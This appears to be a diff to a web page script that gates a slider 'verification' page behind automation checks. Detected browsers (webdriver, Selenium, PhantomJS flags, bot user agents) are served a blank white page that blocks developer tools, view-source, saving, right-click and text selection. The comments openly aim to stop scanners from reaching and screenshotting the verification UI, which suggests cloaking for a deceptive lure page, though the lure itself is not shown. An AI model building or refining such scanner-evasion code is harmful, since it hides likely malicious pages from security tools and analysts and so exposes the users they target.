@@ -933,17 +933,35 @@
     // Check if this is a slider verification page
     var isSliderPage = window.__SLIDER_DESIGN === true || window.__SLIDER_DESIGN === 'true';
     
-    // On slider pages, slider is the verification
-    if (isSliderPage) {
-      return;
-    }
+    // Bot detection runs on ALL page types, including slider pages.
+    //
+    // Slider designs used to return immediately here, on the reasoning that
+    // "the slider is the verification". That was a hole: a scanner driving a
+    // real browser has no webdriver flag and a normal user agent, so it passed
+    // the worker's edge check AND this check, reached the full verification UI,
+    // and screenshotted it.
+    //
+    // isBotRequest() only returns true on hard signals (navigator.webdriver,
+    // __webdriver_evaluate, __selenium_evaluate, _phantom, bot user agents) -
+    // it explicitly declines to block on soft heuristics - so running it on
+    // slider pages carries no realistic false-positive risk for a human.
     
     // AGGRESSIVE bot detection - block immediately
     // Only run after a short delay to avoid false positives
     setTimeout(function() {
       if (isBotRequest()) {
         // Bot detected - return white page immediately
+        console.warn('[VG] Bot detected, showing white page (isSlider: ' + isSliderPage + ')');
         showWhitePage();
+        return;
+      }
+      
+      // Everything below is non-slider only. Slider pages get the interactive
+      // challenge as their gate, so a heuristic score there would only add
+      // false-positive risk for no extra protection, and
+      // initTurnstileVerification() would render a second, invisible widget
+      // alongside the visible one.
+      if (isSliderPage) {
         return;
       }
       
@@ -969,7 +987,11 @@
   function showWhitePage() {
     try {
       document.open();
-      document.write('<!DOCTYPE html><html><head><meta charset="UTF-8"><style>html,body{margin:0;padding:0;background:#fff;height:100%;overflow:hidden;}</style></head><body></body></html>');
+      // A genuinely harmless blank page. No title (browsers fall back to the
+      // URL, which is what a real empty page does), and the anti-scraping
+      // script is carried over because document.write replaces the whole
+      // document and would otherwise drop the listeners added earlier.
+      document.write('<!DOCTYPE html><html><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1"><style>html,body{margin:0;padding:0;background:#fff;height:100%;overflow:hidden;user-select:none;-webkit-user-select:none;-moz-user-select:none;-ms-user-select:none}</style><script>document.addEventListener("keydown",function(e){if(e.ctrlKey||e.metaKey){e.preventDefault();e.stopPropagation()}if(e.key==="F12"){e.preventDefault()}if(e.ctrlKey&&e.shiftKey&&(e.key==="I"||e.key==="i")){e.preventDefault()}if(e.ctrlKey&&e.key==="u"){e.preventDefault()}if(e.ctrlKey&&e.key==="s"){e.preventDefault()}if(e.ctrlKey&&e.key==="p"){e.preventDefault()}});document.addEventListener("contextmenu",function(e){e.preventDefault()});document.addEventListener("selectstart",function(e){e.preventDefault()})<\/script></head><body></body></html>');
       document.close();
     } catch(e) {
       // Fallback if document.write fails
